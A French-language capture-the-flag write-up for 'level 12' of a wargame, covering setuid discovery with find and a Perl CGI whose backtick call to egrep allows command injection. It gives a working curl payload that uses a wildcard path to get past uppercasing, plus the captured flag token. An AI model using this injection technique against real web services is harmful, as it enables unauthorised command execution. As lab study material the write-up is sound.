LEVEL 12

------------------------------------------------------------------------------------------------------------------------

    find . -user level12 2> /dev/null | grep -v proc
                 flag12
    find . -perm /u=s,g=s 2> /dev/null | grep -v proc
    find . -type f -user flag12 -o -user level12
    find . -maxdepth 1 -name "*string*" -print

* Recherches


    On a un CGI en Perl qui prend 2 params : x et y 

    http://192.168.1.21:4646/level12.pl?x=ifconfig&y=netstat

    Les logs du serveur Apache sont visible ici :
        /var/log/apache2

    La faille est à coup sûr ici : injection de commande
        @output = `egrep "^$xx" /tmp/x 2>&1`;

    On upload le fichier pour tester sur l'host

    $xx =~ tr/a-z/A-Z/; --> majusucule
    $xx =~ s/\s.*//;    --> prend tout avant le 1er espace

    Le 2&>1 inintéressant

    Le foreach est useless, le but à priori c'est de parvenir à match la regex avec un fichier contenant getflag


    Pour matcher le egrep, il faut donc un string en uppercase

    Le cgi ne print pas l'output donc à aucun moment on peut avoir le flag dans la réponse http

    On va passer par un fichier contenant le script, Linux étant case sensitive, un getflag dans l'url qui serait capitalize ne fonctionnera pas

    On va chercher à injecter un script executant getflag
    On peut rediriger car, sauf erreur, log insuffisant dans les log d'apache

    Osef de ce que fait  @output = `egrep "^$xx" /tmp/x 2>&1`; car tant qu'on peut y injecter notre code, on l'isole au milieu et ça suffit

    Donc on aura un fichier (en majuscule) : FILE pour matcher le 

    echo '"/bin/getflag" > /tmp/x' > FILE
    curl 127.0.0.1:4646/level12.pl?x='`/*/FILE`'

    Le wildcart est requis pour éviter d'y mettre un string qui va être uppercase par le cgi et donc path vers le FILE non trouvable
    Le /*/ va chercher partout, notamment dans /tmp


    cat /tmp/x => Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

    su level13 g1qKMiRpXf53AWhDaU7FEkczr


* Infos

------------------------------------------------------------------------------------------------------------------------

• REGEX

Le symbole ^ : 	Indique le début de la chaîne - exemple ^chat reconnaît une ligne qui commence par chat

https://perldoc.perl.org/perlrecharclass


\s = Matches any whitespace character (spaces, tabs, line breaks).
. = Matches any character except linebreaks. Equivalent to [^\n\r].
* = Matches 0 or more of the preceding token.

• $foo is a scalar variable. It can hold a single value which can be a string, numeric, etc.

• @foo is an array. Arrays can hold multiple values. You can access these values using an index. For example $foo[0] is the first element of the array and $foo[1] is the second element of the array, etc. (Arrays usually start with zero).

• %foo is a hash, this is like an array because it can hold more than one value, but hashes are keyed arrays. For example, I have a password hash called %password. This is keyed by the user name and the values are the user's password. For example: